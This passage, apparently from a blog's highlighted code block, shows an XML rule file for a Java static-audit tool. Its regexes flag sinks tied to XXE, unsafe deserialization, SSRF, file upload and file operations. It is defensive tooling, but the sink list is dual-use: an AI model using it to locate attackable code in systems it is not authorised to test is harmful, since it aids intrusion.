class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">javaid</span> <span class="attr">vultype</span>=<span class="string">&#x27;XXE&#x27;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">function</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">rule</span> <span class="attr">name</span>=<span class="string">&#x27;SAXReader&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">regmatch</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>new\s+SAXReader\(\)<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">regmatch</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">function</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">function</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">rule</span> <span class="attr">name</span>=<span class="string">&#x27;SAXBuilder&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">regmatch</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>new\s+SAXBuilder\(\)<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">regmatch</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">function</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">function</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">rule</span> <span class="attr">name</span>=<span class="string">&#x27;SAXParser&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">regmatch</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>newSAXParser\(<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">regmatch</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">function</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">function</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">rule</span> <span class="attr">name</span>=<span class="string">&#x27;XMLReader&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">regmatch</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>createXMLReader\(<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">regmatch</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">function</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">function</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">rule</span> <span class="attr">name</span>=<span class="string">&#x27;DocumentBuilder&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">regmatch</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>newDocumentBuilder\(<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">regmatch</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">function</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">function</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">rule</span> <span class="attr">name</span>=<span class="string">&#x27;XMLStreamReader&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">regmatch</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>createXMLStreamReader\(<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">regmatch</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">function</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">javaid</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">javaid</span> <span class="attr">vultype</span>=<span class="string">&#x27;ObjectDeserialization&#x27;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">function</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">rule</span> <span class="attr">name</span>=<span class="string">&#x27;readObject&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">regmatch</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>\.readObject\(<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">regmatch</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">function</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">function</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">rule</span> <span class="attr">name</span>=<span class="string">&#x27;parseObject&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">regmatch</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>JSON\.parseObject\(<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">regmatch</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">function</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">function</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">rule</span> <span class="attr">name</span>=<span class="string">&#x27;readValue&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">regmatch</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>ObjectMapper\.readValue<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">regmatch</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">function</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">function</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">rule</span> <span class="attr">name</span>=<span class="string">&#x27;fromXML&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">regmatch</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>fromXML\(<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">regmatch</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">function</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">function</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">rule</span> <span class="attr">name</span>=<span class="string">&#x27;readUnshared&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">regmatch</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>readUnshared\(<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">regmatch</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">function</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">function</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">rule</span> <span class="attr">name</span>=<span class="string">&#x27;Yaml&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">regmatch</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>\.load\(<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">regmatch</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">function</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">javaid</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">javaid</span> <span class="attr">vultype</span>=<span class="string">&#x27;SSRF&#x27;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">function</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">rule</span> <span class="attr">name</span>=<span class="string">&#x27;HttpClient&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">regmatch</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>CloseableHttpClient\s?[\w\d\_]+\s?=\s?\w?[\w\d\_]+\.createDefault\(<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!-- &lt;regexp&gt;HttpClient\(|executeMethod\(&lt;/regexp&gt; --&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">regmatch</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">function</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">function</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">rule</span> <span class="attr">name</span>=<span class="string">&#x27;HttpAsyncClient&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">regmatch</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>CloseableHttpAsyncClient\s[\w\d\_]+\s?=\s?<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>HttpAsyncClients\.createDefault\(<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">regmatch</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">function</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">function</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">rule</span> <span class="attr">name</span>=<span class="string">&#x27;URLConnection&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">regmatch</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>import\sjava\.net\.URLConnection;<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">regmatch</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">function</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">function</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">rule</span> <span class="attr">name</span>=<span class="string">&#x27;HttpURLConnection&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">regmatch</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>\.openConnection\(|\.getInputStream\(<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">regmatch</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">function</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">function</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">rule</span> <span class="attr">name</span>=<span class="string">&#x27;URL&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">regmatch</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>URL\(|openStream\(<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">regmatch</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">function</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	    <span class="tag">&lt;<span class="name">function</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">rule</span> <span class="attr">name</span>=<span class="string">&#x27;Socket&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">regmatch</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>new\sSocket\(<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">regmatch</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">function</span>&gt;</span>    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">function</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">rule</span> <span class="attr">name</span>=<span class="string">&#x27;OkHttpClient&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">regmatch</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>\.newCall\(|Request.Builder\(\)<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">regmatch</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">function</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	    <span class="tag">&lt;<span class="name">function</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">rule</span> <span class="attr">name</span>=<span class="string">&#x27;ImageIO&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">regmatch</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>ImageIO\.read\(<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">regmatch</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">function</span>&gt;</span> </span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;<span class="name">function</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">rule</span> <span class="attr">name</span>=<span class="string">&#x27;Hutool&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">regmatch</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>HttpRequest\.get<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>HttpRequest\.post<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">regmatch</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">function</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">function</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">rule</span> <span class="attr">name</span>=<span class="string">&#x27;Jsoup&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">regmatch</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>Jsoup\.connect<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">regmatch</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">function</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">function</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">rule</span> <span class="attr">name</span>=<span class="string">&#x27;RestTemplate&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">regmatch</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>\.getForObject\(<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>RestTemplate<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">regmatch</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">function</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	    <span class="tag">&lt;<span class="name">function</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">rule</span> <span class="attr">name</span>=<span class="string">&#x27;SimpleDriverDataSource&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">regmatch</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>\.getConnection\(<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">regmatch</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">function</span>&gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">function</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">rule</span> <span class="attr">name</span>=<span class="string">&#x27;DriverManager&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">regmatch</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>\.getConnection\(<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">regmatch</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">function</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">javaid</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">javaid</span> <span class="attr">vultype</span>=<span class="string">&#x27;FileUpload&#x27;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">function</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">rule</span> <span class="attr">name</span>=<span class="string">&#x27;MultipartFile&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">regmatch</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>\.getOriginalFilename\(|MultipartFile\s<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">regmatch</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">function</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">javaid</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">javaid</span> <span class="attr">vultype</span>=<span class="string">&#x27;File&#x27;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">function</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">rule</span> <span class="attr">name</span>=<span class="string">&#x27;createNewFile&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">regmatch</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>\.createNewFile\(|FileOutputStream\(<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">regmatch</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">function</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">function</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">rule</span> <span class="attr">name</span>=<span class="string">&#x27;delete&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">regmatch</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>\.delete\(\)<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">regmatch</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">function</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">function</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">rule</span> <span class="attr">name</span>=<span class="string">&#x27;FileInputStream&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">regmatch</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>new\sFileInputStream\(<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">regmatch</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">function</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;<span class="name">function</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">rule</span> <span class="attr">name</span>=<span class="string">&#x27;maybe&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">regmatch</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.springframework\.stereotype\.Controller<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.apache\.commons\.io\.FileUtils<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>import\sjava\.nio\.file\.Files<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>import\sjava\.nio\.file\.Path<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>import\sjava\.nio\.file\.Paths<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>import\sjava\.util\.Scanner<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>sun\.nio\.ch\.FileChannelImpl<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>java\.io\.File\.list/listFiles<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>java\.io\.FileInputStream<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>java\.io\.FileOutputStream<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>java\.io\.FileSystem/Win32FileSystem/WinNTFileSystem/UnixFileSystem<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>sun\.nio\.fs\.UnixFileSystemProvider/WindowsFileSystemProvider<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>java\.io\.RandomAccessFile<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>sun\.nio\.fs\.CopyFile<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>sun\.nio\.fs\.UnixChannelFactory<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>sun\.nio\.fs\.WindowsChannelFactory<span 